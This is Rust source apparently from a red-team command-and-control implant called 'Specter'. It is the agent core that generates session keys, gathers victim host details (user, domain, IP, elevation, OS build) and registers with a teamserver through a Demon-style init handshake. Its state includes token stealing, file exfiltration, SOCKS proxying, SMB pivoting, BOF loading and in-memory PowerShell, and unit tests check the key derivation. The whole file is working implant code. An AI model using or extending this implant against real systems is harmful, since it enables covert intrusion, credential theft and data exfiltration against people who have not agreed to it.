//! Core agent logic: init handshake and callback loop.

use red_cell_common::crypto::{
    AgentCryptoMaterial, derive_session_keys, derive_session_keys_for_version,
    generate_agent_crypto_material,
};
use tracing::info;

use std::collections::HashMap;

use crate::metadata::{
    base_address, domain_name, hostname, is_elevated, local_ip, os_build, os_major, os_minor,
    os_service_pack, process_ppid, process_tid, username,
};

use crate::coffeeldr::{self, BofOutputQueue};
use crate::config::SpecterConfig;
use crate::dispatch::{MemFileStore, PsScriptStore};
use crate::download::DownloadTracker;
use crate::ecdh::EcdhSession;
use crate::error::SpecterError;
use crate::job::JobStore;
use crate::pivot::PivotState;
use crate::protocol::{AgentMetadata, build_init_packet, parse_init_ack};
use crate::socket::SocketState;
use crate::token::TokenVault;
use crate::transport::FallbackTransport;

mod ecdh_loop;
mod run_loop;

/// Running state of a Specter agent session.
#[derive(Debug)]
pub struct SpecterAgent {
    pub(super) agent_id: u32,
    raw_crypto: AgentCryptoMaterial,
    session_crypto: AgentCryptoMaterial,
    pub(super) config: SpecterConfig,
    pub(super) transport: FallbackTransport,
    /// Shared monotonic CTR block offset, mirroring the server's single offset.
    ///
    /// Both encrypt (send) and decrypt (recv) operations use and advance this
    /// single counter, matching the teamserver's `AgentEntry::ctr_block_offset`.
    ctr_offset: u64,
    /// Monotonic sequence counter for server-side replay protection.
    ///
    /// Prepended as 8 LE bytes to every callback payload before encryption.
    /// Starts at 1; the teamserver rejects any callback with seq ≤ last_seen_seq.
    callback_seq: u64,
    /// Token vault for impersonation/steal/make operations.
    pub(super) token_vault: TokenVault,
    /// Active file downloads being streamed back to the teamserver.
    pub(super) downloads: DownloadTracker,
    /// In-memory file staging area for `CommandMemFile` chunks.
    pub(super) mem_files: MemFileStore,
    /// Socket state for SOCKS5 proxy and reverse port forwarding.
    socket_state: SocketState,
    /// Pivot state for SMB pivot chain relay.
    pivot_state: PivotState,
    /// Job store for tracking background BOF threads and processes.
    pub(super) job_store: JobStore,
    /// Shared queue for callbacks produced by background BOF threads.
    pub(super) bof_output_queue: BofOutputQueue,
    /// In-memory PowerShell script store for `CommandPsImport`.
    pub(super) ps_scripts: PsScriptStore,
    /// Active ECDH session when `listener_pub_key` is set in config.
    ///
    /// When `Some`, all post-registration traffic uses AES-256-GCM session
    /// packets instead of the legacy Demon AES-CTR wire format.
    pub(super) ecdh_session: Option<EcdhSession>,
}

impl SpecterAgent {
    /// Create a new agent with a random ID and fresh crypto material.
    pub fn new(config: SpecterConfig) -> Result<Self, SpecterError> {
        config.validate()?;

        let agent_id = rand::random::<u32>() | 1; // ensure non-zero
        let raw_crypto = generate_agent_crypto_material()?;
        let session_crypto = match config.init_secret.as_deref() {
            None => raw_crypto.clone(),
            Some(secret) => {
                if let Some(version) = config.init_secret_version {
                    derive_session_keys_for_version(
                        &raw_crypto.key,
                        &raw_crypto.iv,
                        version,
                        &[(version, secret.as_bytes())],
                    )?
                } else {
                    derive_session_keys(&raw_crypto.key, &raw_crypto.iv, secret.as_bytes())?
                }
            }
        };
        let transport = FallbackTransport::new(&config)?;

        info!(
            agent_id = format_args!("0x{agent_id:08X}"),
            hkdf_session = config.init_secret.is_some(),
            "agent initialized"
        );

        Ok(Self {
            agent_id,
            raw_crypto,
            session_crypto,
            config,
            transport,
            ctr_offset: 0,
            callback_seq: 1,
            token_vault: TokenVault::new(),
            downloads: DownloadTracker::new(),
            mem_files: HashMap::new(),
            socket_state: SocketState::new(),
            pivot_state: PivotState::new(),
            job_store: JobStore::new(),
            bof_output_queue: coffeeldr::new_bof_output_queue(),
            ps_scripts: PsScriptStore::new(),
            ecdh_session: None,
        })
    }

    /// Collect metadata about the current host environment.
    pub fn collect_metadata(&self) -> AgentMetadata {
        AgentMetadata {
            hostname: hostname(),
            username: username(),
            domain_name: domain_name(),
            internal_ip: local_ip(),
            process_path: std::env::current_exe()
                .map(|p| p.display().to_string())
                .unwrap_or_default(),
            process_pid: std::process::id(),
            process_tid: process_tid(),
            process_ppid: process_ppid(),
            process_arch: if cfg!(target_arch = "x86_64") { 2 } else { 1 },
            elevated: is_elevated(),
            base_address: base_address(),
            os_major: os_major(),
            os_minor: os_minor(),
            os_product_type: 1,
            os_service_pack: u32::from(os_service_pack()),
            os_build: os_build(),
            os_arch: if cfg!(target_arch = "x86_64") { 9 } else { 0 },
            sleep_delay: self.config.sleep_delay_ms,
            sleep_jitter: self.config.sleep_jitter,
            kill_date: self.config.kill_date.map_or(0, |kd| kd as u64),
            working_hours: self.config.working_hours.unwrap_or(0),
        }
    }

    /// Perform the DEMON_INIT handshake with the teamserver.
    ///
    /// Sends the init packet and validates the acknowledgement. On success,
    /// the local CTR state is synchronised with the shared teamserver offset.
    pub async fn init_handshake(&mut self) -> Result<(), SpecterError> {
        let metadata = self.collect_metadata();
        let packet = build_init_packet(
            self.agent_id,
            &self.raw_crypto,
            &metadata,
            self.config.init_secret_version,
        )?;

        info!(agent_id = format_args!("0x{:08X}", self.agent_id), "sending DEMON_INIT");

        let response = self.transport.send(&packet).await?;
        let ack_blocks = parse_init_ack(&response, self.agent_id, &self.session_crypto)?;

        // The init ACK consumes CTR blocks on the shared offset (server advances
        // the same counter when it encrypts the ACK).
        self.ctr_offset += ack_blocks;

        info!(
            agent_id = format_args!("0x{:08X}", self.agent_id),
            ctr_offset = self.ctr_offset,
            "DEMON_INIT handshake complete (monotonic CTR)"
        );

        Ok(())
    }

    /// Return the agent ID.
    #[must_use]
    pub fn agent_id(&self) -> u32 {
        self.agent_id
    }

    /// Return the current shared CTR block offset.
    #[must_use]
    pub fn ctr_offset(&self) -> u64 {
        self.ctr_offset
    }

    /// Return the next sequence number that will be used in the next callback packet.
    #[must_use]
    pub fn callback_seq(&self) -> u64 {
        self.callback_seq
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn agent_creation_succeeds() {
        let config = SpecterConfig::default();
        let agent = SpecterAgent::new(config);
        assert!(agent.is_ok());
        let agent = agent.expect("already checked");
        assert_ne!(agent.agent_id(), 0);
    }

    #[test]
    fn agent_without_init_secret_uses_raw_session_crypto() {
        let agent = SpecterAgent::new(SpecterConfig::default()).expect("agent creation");
        assert_eq!(agent.raw_crypto, agent.session_crypto);
    }

    #[test]
    fn agent_with_init_secret_derives_session_crypto() {
        let config = SpecterConfig {
            init_secret: Some(String::from("shared-init-secret")),
            ..Default::default()
        };
        let agent = SpecterAgent::new(config).expect("agent creation");

        assert_ne!(agent.raw_crypto, agent.session_crypto);
    }

    #[test]
    fn derive_session_keys_matches_external_hkdf_reference_vectors() {
        // Generated independently with Python's `cryptography` HKDF(SHA256).
        let agent_key = [
            0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd,
            0xee, 0xff, 0xfe, 0xdc, 0xba, 0x98, 0x76, 0x54, 0x32, 0x10, 0x01, 0x23, 0x45, 0x67,
            0x89, 0xab, 0xcd, 0xef,
        ];
        let agent_iv = [
            0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee,
            0xff, 0x00,
        ];

        let alpha = derive_session_keys(&agent_key, &agent_iv, b"server-secret-alpha")
            .expect("alpha derivation");
        assert_eq!(
            alpha.key,
            [
                0x14, 0x9f, 0x14, 0xa0, 0xb5, 0xfc, 0xc3, 0xe1, 0x91, 0x2e, 0xf7, 0x33, 0x2b, 0x29,
                0x69, 0x58, 0x00, 0x2c, 0xaa, 0x64, 0x2a, 0xe2, 0xe5, 0x97, 0xcf, 0xc8, 0xcc, 0xb2,
                0x42, 0xa0, 0xcd, 0x84,
            ]
        );
        assert_eq!(
            alpha.iv,
            [
                0xff, 0x70, 0x00, 0x60, 0x9d, 0x52, 0x44, 0xb5, 0xbc, 0x8b, 0x82, 0xb9, 0x57, 0xaa,
                0x34, 0x48,
            ]
        );

        let bravo = derive_session_keys(&agent_key, &agent_iv, b"server-secret-bravo")
            .expect("bravo derivation");
        assert_eq!(
            bravo.key,
            [
                0x02, 0x83, 0xe9, 0x7f, 0x94, 0xbe, 0x88, 0x63, 0x4b, 0xef, 0xf0, 0x00, 0xab, 0x56,
                0x7b, 0xc6, 0xb0, 0xf9, 0x81, 0x1e, 0xfc, 0x8d, 0xda, 0xf4, 0x65, 0x6c, 0x65, 0xd4,
                0x8f, 0x56, 0xc3, 0x92,
            ]
        );
        assert_eq!(
            bravo.iv,
            [
                0x40, 0xcc, 0x14, 0x69, 0x4b, 0xc5, 0xf0, 0x10, 0xc9, 0x56, 0x79, 0x7a, 0xc1, 0x03,
                0x3b, 0xc2,
            ]
        );
    }

    #[test]
    fn agent_metadata_has_correct_arch_on_x86_64() {
        let config = SpecterConfig::default();
        let agent = SpecterAgent::new(config).expect("agent");
        let meta = agent.collect_metadata();
        if cfg!(target_arch = "x86_64") {
            assert_eq!(meta.process_arch, 2);
            assert_eq!(meta.os_arch, 9);
        }
    }

    #[test]
    fn ctr_accessor_reflects_current_offset() {
        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
        agent.ctr_offset = 7;

        assert_eq!(agent.ctr_offset(), 7);
    }

    #[test]
    fn callback_seq_starts_at_one() {
        let agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
        assert_eq!(agent.callback_seq(), 1);
    }
}
